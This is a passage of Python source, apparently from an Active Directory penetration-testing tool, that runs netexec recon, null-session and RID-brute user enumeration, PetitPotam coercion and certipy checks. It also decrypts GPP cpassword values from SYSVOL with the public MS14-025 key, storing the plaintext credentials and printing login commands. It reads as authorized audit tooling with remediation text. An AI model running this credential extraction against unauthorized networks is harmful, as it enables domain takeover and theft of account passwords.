        cb_value = re.search(r'channel\s*binding[^"\n]*"\s*([^"]+?)\s*"', low)
        if cb_value:
            cb_vulnerable = cb_value.group(1).strip() != "always"
        else:
            cb_vulnerable = bool(
                re.search(r"channel\s*binding[^\n]*(never|when\s*supported|not\s+enforced)", low)
            )
        if cb_vulnerable:
            if host and "relay-target-ldaps" not in host.tags:
                host.tags.append("relay-target-ldaps")
            self.tm.add_finding(
                Finding(
                    id=f"LDAP-CB-{self.dc_ip}",
                    title="LDAPS channel binding not enforced (EPA)",
                    severity="high",
                    host=self.dc_ip,
                    description=(
                        "The Domain Controller does not enforce LDAPS channel "
                        "binding (Extended Protection for Authentication). Even "
                        "when LDAP signing is required, a coerced NTLM "
                        "authentication can be relayed to LDAPS (636) for RBCD / "
                        "Shadow Credentials."
                    ),
                    remediation=(
                        "Enable LDAP channel binding (Domain controller: LDAP "
                        "server channel binding token requirements = Always) and "
                        "deploy Extended Protection for Authentication."
                    ),
                    auth_context="authenticated",
                    command=self._last_nxc_command,
                )
            )
            self.log.finding(f"{self.dc_ip}: LDAPS channel binding NOT enforced -> LDAPS relay target")
        elif re.search(r"channel\s*binding[^\n]*(always|enforced)", low):
            self.log.no_result(
                "ldap-checker: LDAPS channel binding is enforced - system appears resistant"
            )

    def _handle_ldap_adcs(self, output: str) -> None:
        """Register PKI enrollment services discovered by ``nxc ldap -M adcs``."""
        ca_names: list[str] = []
        for line in output.splitlines():
            m = re.search(r"Found PKI Enrollment Server\s*:\s*(.+)", line, re.IGNORECASE)
            if m:
                ca_names.append(m.group(1).strip())
            m2 = re.search(r"CA Name\s*:\s*(.+)", line, re.IGNORECASE)
            if m2:
                ca_names.append(m2.group(1).strip())
        for ca in ca_names:
            self.tm.add_ca(CertificateAuthority(ip=self.dc_ip, ca_name=ca))
        if ca_names:
            self.log.info(
                f"authed-recon: ADCS detected ({len(ca_names)} CA reference(s))"
            )

    # [MODIF] – user enumeration with three-tier fallback strategy.
    def _enum_users_with_fallback(self, dc_ip: str) -> tuple[set[str], str, str]:
        """Enumerate domain users with progressive fallback.

        1. Null-session ``--users``   (quiet, no credential logged)
        2. Null-session ``--rid-brute 500-2000``   (still unauthenticated)
        3. Credentialed ``--users``   (standard authed call via _nxc)

        Returns ``(users, method_description, raw_output)`` so the caller can
        record which strategy succeeded and preserve the full nxc output.
        """
        if not self.nxc_bin or not dc_ip:
            return set(), "nxc unavailable", ""

        # [MODIF] – null session probes use a short subprocess cap (30s) AND pass
        # --timeout to nxc itself so it fails at the SMB layer before Python kills it.
        _NULL_TIMEOUT = 30

        def _run_null(extra: list[str]) -> str:
            """Run nxc with empty credentials (null session), no auth args."""
            cmd = [
                self.nxc_bin, "smb", dc_ip,
                "-u", "", "-p", "",
                "--timeout", str(_NULL_TIMEOUT - 5),   # nxc-level connection timeout
                *extra,
            ]
            label = f"nxc smb {dc_ip} {' '.join(extra)} (null session)"
            self.log.action(f"{label} (up to {_NULL_TIMEOUT}s)")
            try:
                proc = subprocess.run(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL, text=True, timeout=_NULL_TIMEOUT,
                )
                return (proc.stdout or "") + "\n" + (proc.stderr or "")
            except subprocess.TimeoutExpired:
                self.log.warn(f"{label} timed out")
                return ""
            except Exception as exc:
                self.log.debug(f"nxc null session failed: {exc}")
                return ""

        # Attempt 1: null session --users
        out = _run_null(["--users"])
        users = self._parse_users(out) if out else set()
        if users:
            return users, "--users (null session)", out

        # Attempt 2: null session RID cycling
        out = _run_null(["--rid-brute", "500-2000"])
        users = self._parse_users(out) if out else set()
        if users:
            return users, "--rid-brute 500-2000 (null session)", out

        # Attempt 3: credentialed --rid-brute.
        # No --timeout: nxc's connection timeout breaks individual SAMR requests.
        out, _ = self._nxc_capture("smb", [dc_ip], ["--rid-brute", "500-2000"], 60)
        users = self._parse_users(out) if out else set()
        if users:
            return users, "--rid-brute 500-2000 (credentialed)", out

        # Attempt 4: credentialed --users — streams users one by one.
        # No --timeout: would interrupt streaming SAMR enumeration mid-flight.
        # Use max(self.timeout, 300) — large domains can stream 200+ users over ~90s.
        out, _ = self._nxc_capture("smb", [dc_ip], ["--users"], max(self.timeout, 300))
        users = self._parse_users(out) if out else set()
        if users:
            return users, "--users (credentialed)", out

        return set(), "all methods exhausted", out

    # [MODIF] – dedicated section for advanced nxc module audit.
    def _advanced_module_audit(self, result: AuthedReconResult) -> None:
        """Run the advanced nxc module audit section.

        Covers AV/EDR detection, PetitPotam coercion, GPP credential leakage,
        and BadSuccessor delegation abuse. Every module either emits a finding
        (positive) or a no_result notice (negative / inconclusive).
        """
        self.log.banner("Advanced nxc module audit")
        dc_ips = [h.ip for h in self.tm.dcs()] or [self.dc_ip]
        all_smb = [h.ip for h in self.tm.alive_hosts() if h.has_port(445)]

        for module, prefix, title, severity, desc, remediation, scope in _ADVANCED_NXC_MODULES:
            targets = dc_ips if scope == "dc" else all_smb
            if not targets:
                self.log.no_result(f"{module}: no suitable targets — skipping")
                continue

            out = self._nxc("smb", targets, ["-M", module])
            result.raw_outputs[f"adv_{module}"] = out or ""

            if not out:
                self.log.no_result(
                    f"{module}: no output — tool may be missing or targets unreachable"
                )
                continue

            found = False
            for host_ip in targets:
                host_lines = "\n".join(ln for ln in out.splitlines() if host_ip in ln)
                if host_lines and self._module_is_positive(module, host_lines):
                    found = True
                    # [MODIF] – for enum_av, embed the product name in the title/desc.
                    _title = title
                    _desc = desc
                    if module == "enum_av":
                        products = self._parse_av_products(host_lines)
                        if products:
                            _title = f"AV/EDR detected: {', '.join(products)}"
                            _desc = (
                                f"The following security product(s) were identified: "
                                f"{', '.join(products)}. "
                                "Document for the engagement report."
                            )
                            self.log.info(f"  Detected: {', '.join(products)}")
                    self.tm.add_finding(Finding(
                        id=f"{prefix}-{host_ip}",
                        title=_title,
                        severity=severity,
                        host=host_ip,
                        description=_desc,
                        remediation=remediation,
                        evidence=host_lines.strip()[:500],
                        auth_context="authenticated",
                    ))
                    self.log.finding(f"{host_ip}: {_title}")
                    # [MODIF] – extract, display and store recovered GPP credentials.
                    if module == "gpp_password":
                        self._handle_gpp_credentials(host_lines, host_ip)
                    elif module == "gpp_autologin":
                        self._handle_gpp_autologin(host_lines, host_ip)

            if not found:
                self.log.no_result(
                    f"{module}: no result found — system appears resistant to this test"
                )

    # [MODIF] – display and persist GPP credentials recovered from SYSVOL.

    def _handle_gpp_credentials(self, output: str, host_ip: str) -> None:
        """Parse, display and store credentials recovered by ``nxc -M gpp_password``."""
        creds = self._parse_gpp_credentials(output)
        if not creds:
            # Parser found nothing structured — dump the raw lines so the
            # operator can read them directly.
            self.log.info("  GPP password raw output:")
            for line in output.strip().splitlines():
                self.log.info(f"    {line}")
            return

        for entry in creds:
            username = entry.get("username", "?")
            password = entry.get("password", "?")
            domain = entry.get("domain", self.domain or "?")
            gpo = entry.get("gpo", "")
            changed = entry.get("changed", "")

            gpo_info = f"  GPO: {gpo}" if gpo else ""
            changed_info = f"  changed: {changed}" if changed else ""
            self.log.success(
                f"  GPP credential recovered: {domain}\\{username} : {password}"
                + (f"  [{gpo_info.strip()}]" if gpo_info else "")
                + (f"  [{changed_info.strip()}]" if changed_info else "")
            )
            self.tm.add_credential(Credential(
                username=username,
                domain=domain,
                password=password,
                source=f"GPP-SYSVOL@{host_ip}" + (f" ({gpo})" if gpo else ""),
            ))

    def _handle_gpp_autologin(self, output: str, host_ip: str) -> None:
        """Parse, display and store credentials recovered by ``nxc -M gpp_autologin``."""
        creds = self._parse_gpp_autologin(output)
        if not creds:
            self.log.info("  GPP autologin raw output:")
            for line in output.strip().splitlines():
                self.log.info(f"    {line}")
            return

        for entry in creds:
            username = entry.get("username", "?")
            password = entry.get("password", "?")
            domain = entry.get("domain", self.domain or "?")
            self.log.success(
                f"  GPP autologin credential: {domain}\\{username} : {password}"
            )
            self.tm.add_credential(Credential(
                username=username,
                domain=domain,
                password=password,
                source=f"GPP-AUTOLOGIN@{host_ip}",
            ))

    # [MODIF] – direct SYSVOL GPP walk, more reliable than nxc -M gpp_password.

    # MS14-025 published AES-256 key for GPP cpassword decryption.
    _GPP_AES_KEY = bytes.fromhex(
        "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
    )
    # GPP XML filenames that may embed cpassword attributes.
    # Scan ALL .xml files as a fallback — some DCs use non-standard names.
    _GPP_XML_NAMES = frozenset({
        "groups.xml", "services.xml", "scheduledtasks.xml",
        "datasources.xml", "printers.xml", "drives.xml",
        "registry.xml",   # autologin credentials stored here
    })

    @staticmethod
    def _gpp_login_name(username: str, new_name: str) -> str:
        """Resolve the sAMAccountName to authenticate with from a GPP entry.

        The built-in administrator appears in GPP as the GPMC display label
        ``Administrator (built-in)`` — not a usable login. When the policy
        renames the account, the real name is in the ``newName`` attribute;
        otherwise the ``(built-in)`` label is stripped back to the bare name.
        """
        if new_name and new_name.strip():
            return new_name.strip()
        bare = re.sub(r"\s*\(built-in\)\s*$", "", username, flags=re.IGNORECASE).strip()
        return bare or username

    @classmethod
    def _gpp_decrypt(cls, cpassword: str) -> str | None:
        """Decrypt a GPP cpassword value using the MS14-025 AES-256 key."""
        if not _HAS_CRYPTO or not cpassword:
            return None
        try:
            padded = cpassword + "=" * (-len(cpassword) % 4)
            raw = base64.b64decode(padded)
            cipher = _AES.new(cls._GPP_AES_KEY, _AES.MODE_CBC, iv=b"\x00" * 16)
            decrypted = cipher.decrypt(raw)
            # Strip PKCS7 padding then decode UTF-16-LE.
            pad_len = decrypted[-1]
            if 1 <= pad_len <= 16:
                decrypted = decrypted[:-pad_len]
            return decrypted.decode("utf-16-le").rstrip("\x00")
        except Exception:
            return None

    def _sysvol_gpp_walk(self, result: AuthedReconResult) -> None:
        """Walk SYSVOL over SMB to find and decrypt GPP cpassword credentials.

        Covers Groups.xml, Services.xml, ScheduledTasks.xml and other GPP types.
        Complements / replaces nxc -M gpp_password when that module misses files.
        """
        if not _HAS_IMPACKET_SMB:
            self.log.debug("sysvol-gpp: impacket SMBConnection unavailable")
            return
        if not _HAS_CRYPTO:
            self.log.warn("sysvol-gpp: pycryptodome missing — cannot decrypt cpassword")
            return

        self.log.action(f"SYSVOL GPP walk -> {self.dc_ip}")
        found: list[dict] = []

        # Use a short connection timeout — the walk must not block on a slow DC.
        _smb_timeout = min(self.timeout, 30)
        try:
            smb = _SMBConnection(self.dc_ip, self.dc_ip, timeout=_smb_timeout)
            smb.login(
                self.cred.username,
                self.cred.password or "",
                self.domain,
                nthash=self.cred.real_nt_hash or "",
            )
        except Exception as exc:
            self.log.warn(f"sysvol-gpp: SMB login failed ({exc}) — skipping SYSVOL walk")
            return

        def _read_file(path: str) -> bytes | None:
            buf = io.BytesIO()
            try:
                smb.getFile("SYSVOL", path, buf.write)
                return buf.getvalue()
            except Exception:
                return None

        def _parse_xml(content: bytes, path: str) -> None:
            try:
                root = ET.fromstring(content)
            except Exception:
                return
            for elem in root.iter():
                cpassword = (
                    elem.get("cpassword") or elem.get("cPassword") or elem.get("Cpassword")
                )
                if not cpassword:
                    continue
                password = self._gpp_decrypt(cpassword)
                if not password:
                    continue
                username = (
                    elem.get("userName") or elem.get("username") or
                    elem.get("name") or elem.get("runAs") or "?"
                )
                # [MODIF] – the built-in admin is often *renamed* via GPP; the
                # real sAMAccountName lives in newName. acctDisabled flags an
                # account that won't authenticate even with the right password.
                new_name = elem.get("newName") or ""
                acct_disabled = (elem.get("acctDisabled") or "") == "1"
                found.append({
                    "username": username,
                    "new_name": new_name,
                    "acct_disabled": acct_disabled,
                    "cpassword": cpassword,
                    "password": password,   # None when _HAS_CRYPTO is False
                    "path": path,
                })

        xml_scanned: list[str] = []

        def _walk(path: str, depth: int = 0) -> None:
            if depth > 10:
                return
            try:
                entries = smb.listPath("SYSVOL", path + "\\*")
            except Exception as exc:
                self.log.debug(f"sysvol-gpp: listPath({path!r}) failed: {exc}")
                return
            for entry in entries:
                name = entry.get_longname()
                if name in (".", ".."):
                    continue
                full = path + "\\" + name
                if entry.is_directory():
                    _walk(full, depth + 1)
                elif name.lower().endswith(".xml"):
                    # Scan ALL xml files — cpassword can appear in any GPP file.
                    xml_scanned.append(full)
                    self.log.debug(f"sysvol-gpp: scanning {full}")
                    content = _read_file(full)
                    if content:
                        _parse_xml(content, full)

        try:
            _walk("")
        except Exception as exc:
            self.log.debug(f"sysvol-gpp: walk error: {exc}")
        finally:
            try:
                smb.logoff()
            except Exception:
                pass

        self.log.info(
            f"  SYSVOL walk: {len(xml_scanned)} XML file(s) scanned"
            + (f" — {len(found)} cpassword(s) found" if found else "")
        )
        if xml_scanned:
            for p in xml_scanned:
                self.log.info(f"    {p}")

        if not found:
            self.log.no_result(f"{self.dc_ip}: SYSVOL GPP walk — no cpassword found")
            return

        # [MODIF] – the same cpassword is frequently replicated across several
        # GPOs; collapse duplicates (keyed by cpassword) so each credential is
        # reported once, keeping the list of GPO paths it was seen in.
        unique: dict[str, dict] = {}
        for e in found:
            key = e["cpassword"]
            if key in unique:
                unique[key]["paths"].append(e["path"])
                continue
            e = dict(e)
            e["paths"] = [e["path"]]
            unique[key] = e
        found = list(unique.values())

        result.raw_outputs["sysvol_gpp"] = "\n".join(
            f"{e['username']} cpassword={e['cpassword']} ({e['path']})" for e in found
        )

        # Write all cpasswords to a loot file for offline reference.
        loot_file = self.loot_dir / "gpp_cpasswords.txt"
        try:
            self.loot_dir.mkdir(parents=True, exist_ok=True)
            with loot_file.open("w", encoding="utf-8") as fh:
                for e in found:
                    fh.write(f"{e['username']}:{e['cpassword']}\n")
        except OSError:
            loot_file = None

        for entry in found:
            username = entry["username"]
            new_name = entry.get("new_name", "")
            acct_disabled = entry.get("acct_disabled", False)
            cpassword = entry["cpassword"]
            paths = entry.get("paths", [entry["path"]])
            path = paths[0]
            xml_file = path.split("\\")[-1]
            password = entry.get("password")  # set only when pycryptodome available

            # [MODIF] – the GPMC label ("Administrator (built-in)") is not a
            # usable login; resolve the real sAMAccountName (renamed via newName
            # when present) so the operator authenticates with the right name.
            login = self._gpp_login_name(username, new_name)
            seen_in = f"  ({len(paths)} GPO(s))" if len(paths) > 1 else ""

            self.log.success(
                f"  [GPP-CPASSWORD] user={username}  ->  login={login}"
                f"  file={xml_file}{seen_in}"
            )
            if new_name:
                self.log.info(f"    renamed built-in account -> '{new_name}'")
            self.log.info(f"    cpassword : {cpassword}")

            if password:
                self.log.success(f"    plaintext : {password}")
                self.log.info(
                    f"    [*] authenticate with:  -u '{login}' -p '{password}'"
                )
                if acct_disabled:
                    self.log.warn(
                        "    [!] acctDisabled=1 in GPP — this account may be "
                        "disabled; the password can still be reused elsewhere "
                        "(spray / local accounts)."
                    )
                self.tm.add_credential(Credential(
                    username=login,
                    domain=self.domain,
                    password=password,
                    source=f"GPP-SYSVOL@{self.dc_ip} ({path})",
                ))
            else:
                # pycryptodome not available — show manual decrypt commands.
                self.log.info(
                    f"\n  Decrypt GPP cpassword offline:\n\n"
                    f"  gpp-decrypt '{cpassword}'\n\n"
                    f"  python3 -c \""
                    f"import base64; from Crypto.Cipher import AES; "
                    f"k=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'); "
                    f"d=base64.b64decode('{cpassword}' + '=='*2); "
                    f"c=AES.new(k,AES.MODE_CBC,b'\\x00'*16); r=c.decrypt(d); "
                    f"print(r[:-r[-1]].decode('utf-16-le'))\""
                )

            self.tm.add_finding(Finding(
                id=f"GPP-CRED-{self.dc_ip}-{username}",
                title=f"GPP cpassword found in SYSVOL: {self.domain}\\{username}",
                severity="high",
                host=self.dc_ip,
                description=(
                    f"A cpassword attribute was found in {xml_file} for "
                    f"account '{username}'. "
                    + (f"Decrypted value: {password}. " if password else
                       f"cpassword: {cpassword}. ")
                    + "The MS14-025 AES key is publicly known — any authenticated "
                    "domain user can decrypt this."
                ),
                remediation=(
                    "Delete the GPP XML entry containing cpassword. "
                    "Apply KB2962486 (MS14-025). Rotate the affected account password immediately."
                ),
                evidence=f"cpassword={cpassword} from {path}",
                auth_context="authenticated",
            ))
            self.log.finding(
                f"{self.dc_ip}: GPP cpassword — {self.domain}\\{login}"
                + (f" : {password}" if password else " (see cpassword above)")
            )

    def _certipy_find(self, result: AuthedReconResult) -> None:
        """Run ``certipy find`` to detect ESC1-8 template misconfigurations."""
        if not self.run_certipy:
            return
        self.tm.record_activity(
            "adcs-enum", self.dc_ip, phase=_PHASE_1B, tool="certipy",
            details="certipy find (ESC1-8 certificate-template audit)",
        )
        runner = CertipyRunner(
            tm=self.tm,
            domain=self.domain,
            dc_ip=self.dc_ip,
            username=self.cred.username,
            password=self.cred.password or "",
            nthash=self.cred.real_nt_hash or "",
            loot_dir=self.loot_dir,
            # certipy find is enumeration; allow it even in safe mode.
            safe_mode=False,
        )
        cres = runner.find_vulnerable_templates()
        result.raw_outputs["certipy_find"] = (cres.stdout or "") + (cres.stderr or "")
        result.adcs_templates = cres.vulnerable_templates

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    def check_prerequisites(self) -> tuple[bool, str]:
        if not self.cred or not self.cred.username:
            return False, "no usable credential"
        if not self.cred.has_auth_secret:
            return False, "credential has neither password nor a genuine NT hash"
        if not self.nxc_bin:
            return False, "nxc/netexec not found in PATH"
        return True, ""

    def run(self) -> AuthedReconResult:
        result = AuthedReconResult()
        ok, reason = self.check_prerequisites()
        if not ok:
            self.log.warn(f"Authenticated recon skipped: {reason}")
            result.status = "skipped"
            return result

        self.log.info(
            f"Authenticated recon as {self.domain}\\{self.cred.username} "
            f"against DC {self.dc_ip or '(unknown)'}"
        )

        # Fail fast: probe the credential once before launching the full
        # enumeration. A wrong password or an unreachable DC would otherwise
        # stall on every one of the ~10 checks until each hits its timeout.
        login_ok, detail = self._validate_login()
        if not login_ok:
            self.log.warn(
                f"Authenticated recon aborted - {detail}. "
                "Re-run with a valid credential via: --phase authed-recon"
            )
            result.status = "auth-failed"
            self._persist_raw(result)
            return result
        self.log.success(f"authed-recon: {detail}")

        self._domain_enum(result)
        # [MODIF] – SYSVOL walk runs early, before heavy LDAP/nxc calls that
        # can exhaust the DC connection pool and cause SMB timeouts.
        try:
            self._sysvol_gpp_walk(result)
        except Exception as exc:  # noqa: BLE001 - best effort, never fatal
            self.log.warn(f"SYSVOL GPP walk failed: {exc}")
        self._vuln_checks(result)
        self._ldap_recon(result)
        # [MODIF] – advanced module audit runs after the standard checks.
        try:
            self._advanced_module_audit(result)
        except Exception as exc:  # noqa: BLE001 - best effort, never fatal
            self.log.warn(f"Advanced nxc module audit failed: {exc}")
        try:
            self._certipy_find(result)
        except Exception as exc:  # noqa: BLE001 - certipy is optional
            self.log.warn(f"certipy find skipped: {exc}")

        self._persist_raw(result)
        return result

    def _persist_raw(self, result: AuthedReconResult) -> None:
        """Dump the raw tool outputs to loot for the audit trail / report."""
        try:
            self.loot_dir.mkdir(parents=True, exist_ok=True)
            out_file = self.loot_dir / "authed_recon.txt"
            with out_file.open("w", encoding="utf-8") as fh:
                for label, content in result.raw_outputs.items():
                    fh.write(f"===== {label} =====\n{content}\n\n")
        except OSError as exc:
            self.log.warn(f"Could not persist authed-recon output: {exc}")
